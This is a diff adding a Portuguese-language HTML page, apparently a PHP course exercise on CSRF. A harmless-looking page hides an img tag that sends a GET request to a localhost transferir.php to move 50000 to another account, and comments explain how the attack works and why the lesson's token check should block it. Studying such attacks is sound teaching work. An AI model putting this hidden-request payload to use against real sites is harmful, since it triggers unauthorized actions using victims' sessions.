@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Atasque</title>
+</head>
+<body>
+    <h1>Página Inofensiva</h1>
+    <p>Esta página parece inofensiva, mas na verdade está realizando um ataque CSRF.</p>
+
+    <!-- Código malicioso. Lembre-se de alterar o enndereço do arquivo transferir.php -->
+
+    <!--
+        A ideia do ataque CSRF aqui:
+        - O navegador tenta "carregar" uma imagem.
+        - Para carregar a imagem, ele faz uma requisição GET para transferir.php.
+        - Se o usuário estiver logado no banco (sessão ativa), essa requisição pode
+          ser feita com a sessão/cookies do usuário.
+        - Se o sistema NÃO tiver proteção CSRF, a transferência poderia acontecer
+          sem o usuário perceber.
+        - No seu caso, o transferir.php exige csrf_token, então essa requisição
+          deve ser bloqueada.
+    -->
+     <img src="http://localhost/dimmy/Estudo/b7web/php/introducao/aula/Modulo03/aula16-CSRF/transferir.php?conta_destino=123458&valor=50000" style="display: none;">
+</body>
+</html>
